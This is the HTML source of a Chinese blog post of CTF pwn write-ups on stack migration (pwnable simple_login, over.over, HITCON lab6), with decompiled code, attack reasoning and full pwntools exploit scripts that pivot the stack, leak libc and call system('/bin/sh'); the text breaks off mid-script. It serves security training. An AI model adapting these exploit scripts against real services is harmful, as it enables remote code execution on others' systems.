<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Stack Migration题目练习 | Welcome to Chumen77&#39;s Blog | Struggle 就完事了 !</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content>
    <meta name="description" content="Stack Migration题目练习前言记录几道Stack Migration的练习题。 pwnable_simple_login查看保护和arch12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  3">
<meta property="og:type" content="article">
<meta property="og:title" content="Stack Migration题目练习">
<meta property="og:url" content="http://chumen77.xyz/2020/02/11/Stack Migration题目练习/index.html">
<meta property="og:site_name" content="Welcome to Chumen77&#39;s Blog">
<meta property="og:description" content="Stack Migration题目练习前言记录几道Stack Migration的练习题。 pwnable_simple_login查看保护和arch12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  3">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15814303737109.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15814310284289.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15814313605840.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15814316930734.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15814741030442.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15814741289950.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15814770925207.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15817739064330.jpg">
<meta property="og:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15817774030678.jpg">
<meta property="og:image" content="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png">
<meta property="og:updated_time" content="2020-02-18T12:20:29.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Stack Migration题目练习">
<meta name="twitter:description" content="Stack Migration题目练习前言记录几道Stack Migration的练习题。 pwnable_simple_login查看保护和arch12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  3">
<meta name="twitter:image" content="http://chumen77.xyz/2020/02/11/Stack%20Migration题目练习/images/15814303737109.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="Welcome to Chumen77&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

</head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">chumen77</h5>
          <a href="mailto:973059980@qq.com" title="973059980@qq.com" class="mail">973059980@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/chumen77" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="http://www.weibo.com/" target="_blank" >
                <i class="icon icon-lg icon-weibo"></i>
                Weibo
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Stack Migration题目练习</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Stack Migration题目练习</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-02-11T13:51:48.000Z" itemprop="datePublished" class="page-time">
  2020-02-11
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Stack-Migration题目练习"><span class="post-toc-number">1.</span> <span class="post-toc-text">Stack Migration题目练习</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pwnable-simple-login"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">pwnable_simple_login</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查看保护和arch"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">查看保护和arch</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ida分析"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">ida分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#攻击思路"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">攻击思路</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EXP"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">EXP</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#安恒月赛-over-over"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">安恒月赛_over.over</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查保护和arch"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">查保护和arch</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ida分析-1"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">ida分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#攻击思路-1"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">攻击思路</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#HITCON-training-lab6"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">HITCON_training_lab6</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#源码"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">源码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#spwn"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">spwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查保护和arch-1"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">查保护和arch</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#尝试运行"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">尝试运行</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ida分析-2"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">ida分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#攻击思路-2"><span class="post-toc-number">1.5.3.1.</span> <span class="post-toc-text">攻击思路</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp-2"><span class="post-toc-number">1.5.4.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ACTF-2019-hardcore-fmt"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">ACTF_ 2019_hardcore fmt</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查保护和arch-2"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">查保护和arch</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ida分析-3"><span class="post-toc-number">1.6.2.</span> <span class="post-toc-text">ida分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp-3"><span class="post-toc-number">1.6.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Stack Migration题目练习"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Stack Migration题目练习</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-02-11 21:51:48" datetime="2020-02-11T13:51:48.000Z"  itemprop="datePublished">2020-02-11</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Stack-Migration题目练习"><a href="#Stack-Migration题目练习" class="headerlink" title="Stack Migration题目练习"></a>Stack Migration题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录几道Stack Migration的练习题。</p>
<h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><h3 id="查看保护和arch"><a href="#查看保护和arch" class="headerlink" title="查看保护和arch"></a>查看保护和arch</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>32位程序，开了nx和Canary保护。</p>
<h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> de_s; <span class="comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> de_length; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1E</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Authenticate : "</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%30s"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;input, <span class="number">0</span>, <span class="number">0xC</span>u);</span><br><span class="line">  de_s = <span class="number">0</span>;</span><br><span class="line">  de_length = Base64Decode((<span class="keyword">int</span>)&amp;s, &amp;de_s);     <span class="comment">// v6 = 解码后的长度</span></span><br><span class="line">  <span class="keyword">if</span> ( de_length &gt; <span class="number">0xC</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong Length"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;input, de_s, de_length);  <span class="comment">// 执行完，把解码后的字段，放入input的bss内存上</span></span><br><span class="line">    <span class="keyword">if</span> ( auth(de_length) == <span class="number">1</span> )</span><br><span class="line">      correct();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（其中已经改了部分变量的名称方便读代码）<br>流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814303737109.jpg" alt="-w601"><br>接着进入auth函数分析一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __<span class="function">cdecl <span class="title">auth</span><span class="params">(<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *s2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v4, &amp;input, length);</span><br><span class="line">  s2 = (<span class="keyword">char</span> *)calc_md5((<span class="keyword">int</span>)&amp;v2, <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hash : %s\n"</span>, s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814310284289.jpg" alt="-w407"><br>发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。<img src="/2020/02/11/Stack Migration题目练习/images/15814313605840.jpg" alt="-w1241"><br>然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路：</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814316930734.jpg" alt="-w353"><br>到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from base64 import *</span><br><span class="line"># io = process(&apos;./login&apos;)</span><br><span class="line">io = remote(&apos;node3.buuoj.cn&apos;,29026)</span><br><span class="line">system_add = 0x08049284</span><br><span class="line">buf = 0x0811EB40</span><br><span class="line">io.recvuntil(&apos;e : &apos;)</span><br><span class="line">p = &apos;aaaa&apos; + p32(system_add) + p32(buf)</span><br><span class="line">io.sendline(b64encode(p))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="安恒月赛-over-over"><a href="#安恒月赛-over-over" class="headerlink" title="安恒月赛_over.over"></a>安恒月赛_over.over</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>64位，只开了nx</p>
<h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  while ( sub_400676() )</span><br><span class="line">    ;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主函数十分简单，主要核心就在while包裹的函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int sub_400676()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-50h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;buf, 0, 0x50uLL);</span><br><span class="line">  putchar(&apos;&gt;&apos;);</span><br><span class="line">  read(0, &amp;buf, 0x60uLL);</span><br><span class="line">  return puts(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，<br>那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。</p>
<p>可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\x00’的:<br><img src="/2020/02/11/Stack Migration题目练习/images/15814741030442.jpg" alt="-w781"><br><img src="/2020/02/11/Stack Migration题目练习/images/15814741289950.jpg" alt="-w649"></p>
<p>然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。<br><img src="/2020/02/11/Stack Migration题目练习/images/15814770925207.jpg" alt="-w842"><br>算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。</p>
<h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">io = process(<span class="string">'./over.over'</span>)</span><br><span class="line">e = ELF(<span class="string">'./over.over'</span>)</span><br><span class="line">l = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">leave_ret = <span class="number">0x004006be</span> </span><br><span class="line">pop_rdi_ret = <span class="number">0x0400793</span></span><br><span class="line">put_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">put_plt = e.symbols[<span class="string">'puts'</span>]</span><br><span class="line">padding = <span class="number">80</span></span><br><span class="line">raw_input(<span class="string">'-&gt;'</span>)</span><br><span class="line">io.sendafter(<span class="string">"&gt;"</span>, <span class="string">'a'</span> * <span class="number">80</span>)</span><br><span class="line"><span class="comment"># stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70</span></span><br><span class="line">stack = u64((io.recvline())[<span class="number">80</span>:<span class="number">86</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x70</span></span><br><span class="line">io.readuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">print(hex(stack))</span><br><span class="line">p = flat([<span class="string">'11111111'</span>,pop_rdi_ret,put_got,put_plt,<span class="number">0x000400580</span>,(<span class="number">80</span><span class="number">-40</span>)*<span class="string">'1'</span>,stack,leave_ret])</span><br><span class="line">raw_input(<span class="string">'-&gt;'</span>)</span><br><span class="line">io.send(p)</span><br><span class="line">libc = u64(io.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>: ].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - l.symbols[<span class="string">'puts'</span>]</span><br><span class="line">print(hex(libc))</span><br><span class="line">io.sendafter(<span class="string">"&gt;"</span>, <span class="string">'a'</span> * <span class="number">80</span>)</span><br><span class="line">stack = u64((io.recvline())[<span class="number">80</span>:<span class="number">86</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x70</span></span><br><span class="line">print(hex(stack))</span><br><span class="line">io.readuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">system_add = libc + l.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_add = libc + l.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">p = flat([<span class="string">'22222222'</span>,pop_rdi_ret,binsh_add,system_add,(<span class="number">80</span><span class="number">-4</span>*<span class="number">8</span>)*<span class="string">'2'</span>,stack,leave_ret])</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="HITCON-training-lab6"><a href="#HITCON-training-lab6" class="headerlink" title="HITCON_training_lab6"></a>HITCON_training_lab6</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">1337</span> ;</span><br><span class="line"><span class="keyword">char</span> *t= <span class="string">"Z\xc3"</span> ;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>( count!=<span class="number">1337</span> )&#123;</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">count++ ;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">48</span>];</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Try your best : "</span> );</span><br><span class="line">read(<span class="number">0</span>, buf,<span class="number">128</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令。<br>然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &apos;i386&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"># io = process(&apos;./migration&apos;)</span><br><span class="line">io = remote(&apos;127.0.0.1&apos;,4000)</span><br><span class="line">e = ELF(&apos;./migration&apos;)</span><br><span class="line">l = ELF(&apos;/lib/i386-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line">padding = 40</span><br><span class="line">puts_plt = e.symbols[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">read = e.symbols[&apos;read&apos;]</span><br><span class="line">leave_ret = 0x08048418</span><br><span class="line">buf1 = 0x0804b000 - 0x100</span><br><span class="line">buf2 = buf1 - 0x50</span><br><span class="line">pop_edx_ret = 0x0804836d</span><br><span class="line">p = &apos;a&apos; * padding + flat([buf1,read,leave_ret,0,buf1,0x50])</span><br><span class="line">io.readuntil(&apos;:\n&apos;)</span><br><span class="line">io.send(p)</span><br><span class="line">p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])</span><br><span class="line">sleep(0.1)</span><br><span class="line">raw_input(&apos;-&gt;&apos;)</span><br><span class="line">io.sendline(p)</span><br><span class="line">puts_add = u32(io.recv(4))</span><br><span class="line">libc = puts_add - l.symbols[&apos;puts&apos;]</span><br><span class="line">print(hex(libc))</span><br><span class="line">system_add = l.symbols[&apos;system&apos;] + libc</span><br><span class="line">binsh_add = l.search(&apos;/bin/sh\x00&apos;).next() + libc</span><br><span class="line">p = 